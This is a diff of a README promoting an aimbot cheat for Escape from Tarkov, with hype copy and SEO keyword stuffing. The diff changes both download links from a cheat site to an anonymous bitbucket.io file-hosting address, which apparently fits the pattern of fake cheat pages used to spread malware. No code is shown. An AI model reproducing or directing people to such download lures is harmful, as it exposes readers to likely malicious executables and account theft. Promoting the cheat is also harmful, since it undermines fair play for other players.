@@ -2,7 +2,7 @@
 
 **Still missing your shots while that kitted PMC lasers you from 100 meters? With a proper EFT aimbot, every bullet hits, every shot counts, and every raid ends with you on top of the loot pile.**
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🔍 What Is an EFT Aimbot?
@@ -11,7 +11,7 @@ An **EFT aimbot** is a cheat tool that automatically locks your aim onto targets
 
 This cheat is a core feature in most premium Escape from Tarkov hack menus, usually bundled with ESP, no recoil, and radar.
 
-[![Download Aimbot](https://repository-images.githubusercontent.com/723191315/c1083bbe-43c6-4af8-a72d-a757dda92402)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Aimbot](https://repository-images.githubusercontent.com/723191315/c1083bbe-43c6-4af8-a72d-a757dda92402)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🎯 Top EFT Aimbot Features
@@ -93,3 +93,4 @@ eft aimbot, escape from tarkov aimbot pc, silent aim tarkov, tarkov auto aim che
 ---
 
 **You’ve got the gear. Now get the aim.** Whether you play silent or aggressive, an EFT aimbot gives you the upper hand in every raid. One shot. One loot pile. All yours. 🔫💼🎯
+
